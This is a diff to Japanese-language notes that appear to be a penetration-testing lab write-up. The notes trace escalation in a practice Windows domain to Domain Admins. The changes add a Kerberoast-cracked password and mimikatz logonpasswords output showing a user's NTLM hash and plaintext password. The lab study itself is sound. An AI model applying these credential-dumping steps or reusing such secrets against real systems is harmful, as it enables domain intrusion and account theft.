@@ -3,7 +3,7 @@
 
 流れとしては
 
-**10.11.1.123** (ただのUsersグループ) -> **10.11.1.121** (サービスアカウント) -> **10.11.1.120** (Domain Admins)
+**10.11.1.123** (ただのUsersグループ) -> **10.11.1.121** (サービスアカウント) -> 10.11.1.122 (Server Personelのユーザ) -> **10.11.1.120** (Domain Admins)
 
 の流れ。
 
@@ -53,6 +53,8 @@ SID               : S-1-5-21-3051798232-4248191986-2095020414-500
 このAdministratorって自分の、xor-app59のAdministratorのことだよ）したけど無理だった。
 
 しかし、**Kerberoasができた！** （`Invoke-Kerberoast`でkrb5tgs型のハッシュをとって変換してhashcatでクラックするやつ）
+
+-> これでshantewhiteというパスワードをゲット
 
 
 # 10.11.1.121 (サービスアカウント）
@@ -159,13 +161,29 @@ member                 : {CN=Albert,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com, CN
 やはり！daisy（10.11.1.122）のとこにdavidのクリデンシャルがあった！！
 
 ```
-mimikatz # sekurlsa::logonpasswords
-
-Authentication Id : 0 ; 412581 (00000000:00064ba5)                                                                                                               Session           : Batch from 0                                                                                                                                 User Name         : david                                                                                                                                        Domain            : xor                                                                                                                                          Logon Server      : XOR-DC01                                                                                                                                     Logon Time        : 12/18/2021 5:59:52 AM                                                                                                                        SID               : S-1-5-21-2293535422-227910474-3663383505-1123                                                                                                        msv :                                                                                                                                                             [00000003] Primary                                                                                                                                               * Username : david                                                                                                                                               * Domain   : xor                                                                                                                                                 * NTLM     : d4738e8c31d43e0147f27894a20e6683                                                                                                                    * SHA1     : b1c2b2c766e7ad7688029ebc42fbacabae7fba72                                                                                                            * DPAPI    : b712cb5d0fb0bdf9530c115100e2b574                                                                                                                   tspkg :                                                                                                                                                          wdigest :                                                                                                                                                         * Username : david                                                                                                                                               * Domain   : xor                                                                                                                                                 * Password : (null)                                                                                                                                             kerberos :                                                                                                                                                        * Username : david                                                                                                                                               * Domain   : XOR.COM                                                                                                                                             * Password : dsfdf34534tdfGDFG5rdgr 
+Authentication Id : 0 ; 412579 (00000000:00064ba3)
+Session           : Batch from 0
+User Name         : david
+Domain            : xor
+Logon Server      : XOR-DC01
+Logon Time        : 12/18/2021 7:45:13 AM
+SID               : S-1-5-21-2293535422-227910474-3663383505-1123
+        msv :
+         [00000003] Primary
+         * Username : david
+         * Domain   : xor
+         * NTLM     : d4738e8c31d43e0147f27894a20e6683
+         * SHA1     : b1c2b2c766e7ad7688029ebc42fbacabae7fba72
+         * DPAPI    : b712cb5d0fb0bdf9530c115100e2b574
+        tspkg :
+        wdigest :
+         * Username : david
+         * Domain   : xor
+         * Password : (null)
+        kerberos :
+         * Username : david
+         * Domain   : XOR.COM
+         * Password : dsfdf34534tdfGDFG5rdgr
+        ssp :
+        credman :
 ```
-
-daisyでBlood Houndやってみよう（daisyがxor-app07と判明した）。
-
-
-
-![Hound_on_Daisy](https://user-images.githubusercontent.com/85237728/146646657-106a16a7-1671-402c-949d-b6176daaefab.png)
